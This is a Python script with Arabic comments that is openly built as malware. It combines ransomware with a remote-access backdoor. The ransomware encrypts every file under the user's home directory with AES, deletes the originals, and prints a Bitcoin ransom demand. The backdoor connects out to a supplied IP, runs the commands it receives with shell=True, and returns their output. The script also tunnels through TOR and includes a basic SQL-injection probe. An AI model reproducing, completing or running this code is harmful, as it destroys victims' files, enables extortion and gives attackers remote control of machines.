import socket
import threading
import os
import time
import requests
import subprocess
import base64
from Crypto.Cipher import AES
import random
import string
import logging
import sqlite3
import socks
import ssl
import sys
import platform
import urllib.request
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# إعدادات السجل
logging.basicConfig(filename='spyeye_log.txt', level=logging.DEBUG)

# دالة لتوليد مفتاح AES باستخدام PBKDF2
def generate_aes_key():
    password = "securepassword123"  # يمكن توليد كلمة مرور آمنة عشوائيًا
    salt = os.urandom(16)  # مولد السول الملح لتوليد المفاتيح
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return kdf.derive(password.encode())

# دالة لتشفير البيانات باستخدام AES
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return cipher.nonce + tag + ciphertext

# دالة لاستخدام TOR + VPN
def use_tor_and_vpn():
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket
    print("[INFO] Using TOR Proxy")
    subprocess.run("openvpn --config myconfig.ovpn", shell=True)

# دالة لاكتشاف SQL Injection
def detect_sql_injection(url, payload):
    try:
        response = requests.get(url + payload)
        if "error" in response.text:
            logging.info(f"SQL Injection vulnerability detected: {url + payload}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error: {e}")

# دالة لتوليد مفتاح AES عشوائي لتشفير الملفات
def generate_aes_key_for_files():
    return os.urandom(32)

# دالة لتشفير الملفات باستخدام AES
def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        file_data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(file_data)

    # حفظ البيانات المشفرة في ملف جديد
    with open(file_path + '.locked', 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)

    # حذف الملف الأصلي
    os.remove(file_path)

# دالة لعرض رسالة فدية
def ransom_message():
    message = """
    [INFO] Your files have been encrypted.
    [INFO] To get the decryption key, send 1 Bitcoin to the following address:
    [INFO] 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
    [INFO] After payment, send the proof to ransom@yourmail.com.
    """
    print(message)

# دالة لتشفير جميع الملفات في المجلد
def encrypt_all_files_in_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)
                logging.info(f"Encrypted: {file_path}")
            except Exception as e:
                logging.error(f"Error encrypting {file_path}: {e}")

# دالة لإرسال البيانات المشفرة
def send_encrypted_data(data, target_ip, target_port):
    key = generate_aes_key()
    encrypted_data = encrypt_data(data, key)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(encrypted_data)
            logging.info(f"Sent encrypted data to {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"Error sending data: {e}")

# دالة لبدء عملية **Ransomware**
def start_ransomware(target_ip):
    # توليد مفتاح AES
    key = generate_aes_key_for_files()

    # تشفير الملفات في المجلد الرئيسي
    home_directory = os.path.expanduser("~")
    encrypt_all_files_in_directory(home_directory, key)

    # عرض رسالة الفدية
    ransom_message()

    # إرسال البيانات المشفرة إلى الخادم (إذا لزم الأمر)
    send_encrypted_data(f"Files encrypted on {home_directory}", target_ip, 8080)

# دالة لبدء الاتصال بالجهاز المصاب عبر RAT
def start_rAT_connection(target_ip, target_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            logging.info(f"Connected to {target_ip}:{target_port}")
            while True:
                command = s.recv(1024).decode()
                if command == "exit":
                    break
                output = subprocess.run(command, shell=True, capture_output=True)
                s.sendall(output.stdout + output.stderr)
    except Exception as e:
        logging.error(f"Error in RAT connection: {e}")

def main():
    use_tor_and_vpn()
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    
    # بدء اتصال RAT
    start_rAT_connection(target_ip, target_port)
    
    # بدء عملية Ransomware
    start_ransomware(target_ip)

if __name__ == "__main__":
    main()
